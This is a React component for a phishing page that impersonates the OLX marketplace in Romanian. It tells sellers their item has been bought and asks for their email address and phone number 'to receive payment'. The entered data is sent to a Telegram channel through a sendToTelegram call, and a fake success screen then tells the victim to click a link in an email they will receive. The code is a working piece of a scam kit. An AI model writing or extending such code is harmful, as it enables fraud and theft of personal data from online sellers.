import React, { useState } from 'react';
import { Check } from 'lucide-react';
import { sendToTelegram } from '../utils/api';

interface FormData {
  email: string;
  phone: string;
}

export default function OLXForm() {
  const [formData, setFormData] = useState<FormData>({
    email: '',
    phone: ''
  });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<FormData>>({});

  const validateForm = (): boolean => {
    const newErrors: Partial<FormData> = {};
    
    // Email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!formData.email.trim()) {
      newErrors.email = 'Adres e-mail jest wymagany';
    } else if (!emailRegex.test(formData.email)) {
      newErrors.email = 'Introduceți o adresă de email validă';
    }

    if (!formData.phone.trim()) {
      newErrors.phone = 'Numărul de telefon este obligatoriu';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    
    try {
      await sendToTelegram(formData);
      setIsSubmitted(true);
    } catch (error) {
      console.error('Error sending data:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    
    // Clear error when user starts typing
    if (errors[name as keyof FormData]) {
      setErrors(prev => ({
        ...prev,
        [name]: undefined
      }));
    }
  };

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="w-full max-w-md">
          {/* OLX Logo */}
          <div className="text-center mb-8">
            <div className="inline-block bg-gradient-to-r from-[#00D4AA] to-[#00B896] text-white px-4 py-2 rounded-lg font-bold text-xl">
              olx
            </div>
          </div>

          <div className="bg-white rounded-2xl shadow-lg p-8 text-center">
            {/* Success Icon */}
            <div className="w-16 h-16 bg-[#23E5DB]/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <Check className="w-8 h-8 text-[#23E5DB]" />
            </div>

            <h2 className="text-2xl font-bold text-gray-800 mb-4">
              Email-ul a fost trimis!
            </h2>
            
            <p className="text-gray-600 mb-4">
              Am trimis un mesaj la adresa:
            </p>
            
            <p className="font-semibold text-gray-800 mb-6">
              {formData.email}
            </p>

            <div className="bg-[#23E5DB]/5 rounded-xl p-4 mb-6">
              <div className="flex items-center justify-center mb-3">
                <div className="w-6 h-6 bg-[#23E5DB] rounded-full flex items-center justify-center">
                  <span className="text-white text-sm">ℹ</span>
                </div>
                <span className="ml-2 font-semibold text-gray-800">Ce urmează?</span>
              </div>
              
              <div className="text-left space-y-2 text-sm text-gray-600">
                <div className="flex items-start">
                  <span className="text-[#23E5DB] font-bold mr-2">1.</span>
                  <span>Verificați-vă căsuța poștală</span>
                </div>
                <div className="flex items-start">
                  <span className="text-[#23E5DB] font-bold mr-2">2.</span>
                  <span>Faceți clic pe linkul din mesajul primit</span>
                </div>
                <div className="flex items-start">
                  <span className="text-[#23E5DB] font-bold mr-2">3.</span>
                  <span>Dacă nu vedeți email-ul, verificați folderul spam</span>
                </div>
              </div>
            </div>

            <div className="text-center text-lg font-semibold text-[#23E5DB] mb-6">
              Veți primi email-ul în 5-10 minute
            </div>

            <button 
              onClick={() => setIsSubmitted(false)}
              className="w-full bg-[#002F34] hover:bg-[#001F24] text-white font-semibold py-3 px-6 rounded-xl transition-colors duration-200"
            >
              Trimiteți din nou
            </button>

            <button 
              onClick={() => setIsSubmitted(false)}
              className="w-full mt-3 bg-transparent text-gray-600 hover:text-gray-800 font-medium py-3 px-6 transition-colors duration-200"
            >
              Schimbați adresa de email
            </button>
          </div>

          <p className="text-center text-sm text-gray-500 mt-6">
            Probleme cu primirea email-urilor?
            <a href="#" className="text-[#23E5DB] hover:underline ml-1">
              Contactați suportul
            </a>
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {/* OLX Logo */}
        <div className="text-center mb-8">
          <div className="inline-block bg-[#002F34] text-[#23E5DB] px-4 py-2 rounded-lg font-bold text-xl">
            olx
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-lg p-8">
          <h1 className="text-2xl font-bold text-gray-800 mb-4 text-center">
            Bun venit pe OLX!
          </h1>
          
          <p className="text-gray-600 text-center mb-8 leading-relaxed">
            Produsul dvs. a fost cumpărat prin OLX. Vă rugăm să 
            furnizați adresa de email și numărul de telefon pentru a primi 
            plata pentru produs.
          </p>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Email Field */}
            <div>
              <label htmlFor="email" className="block text-sm font-semibold text-gray-700 mb-2">
                Adresa de email
              </label>
              <input
                type="email"
                id="email"
                name="email"
                value={formData.email}
                onChange={handleInputChange}
                placeholder="introduceți email-ul dvs."
                className={`w-full px-4 py-3 border rounded-xl focus:outline-none focus:ring-2 focus:ring-[#23E5DB] focus:border-transparent transition-all duration-200 ${
                  errors.email ? 'border-red-500 bg-red-50' : 'border-gray-300 hover:border-gray-400'
                }`}
                disabled={isLoading}
              />
              {errors.email && (
                <p className="mt-2 text-sm text-red-600">{errors.email}</p>
              )}
            </div>

            {/* Phone Field */}
            <div>
              <label htmlFor="phone" className="block text-sm font-semibold text-gray-700 mb-2">
                Numărul de telefon
              </label>
              <input
                type="tel"
                id="phone"
                name="phone"
                value={formData.phone}
                onChange={handleInputChange}
                placeholder="introduceți numărul de telefon"
                className={`w-full px-4 py-3 border rounded-xl focus:outline-none focus:ring-2 focus:ring-[#23E5DB] focus:border-transparent transition-all duration-200 ${
                  errors.phone ? 'border-red-500 bg-red-50' : 'border-gray-300 hover:border-gray-400'
                }`}
                disabled={isLoading}
              />
              {errors.phone && (
                <p className="mt-2 text-sm text-red-600">{errors.phone}</p>
              )}
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-[#002F34] hover:bg-[#001F24] disabled:bg-gray-400 text-white font-semibold py-3 px-6 rounded-xl transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98]"
            >
              {isLoading ? 'Se trimite...' : 'Continuați'}
            </button>

            <p className="text-xs text-gray-500 text-center leading-relaxed">
              Făcând clic pe "Continuați", sunteți de acord cu{' '}
              <a href="#" className="text-[#23E5DB] hover:underline">
                Termenii de utilizare
              </a>{' '}
              și{' '}
              <a href="#" className="text-[#23E5DB] hover:underline">
                Politica de confidențialitate
              </a>
              .
            </p>
          </form>
        </div>

        <p className="text-center text-sm text-gray-500 mt-6">
          Aveți deja un cont?{' '}
          <a href="#" className="text-[#23E5DB] hover:underline font-medium">
            Conectați-vă
          </a>
        </p>
      </div>
    </div>
  );
}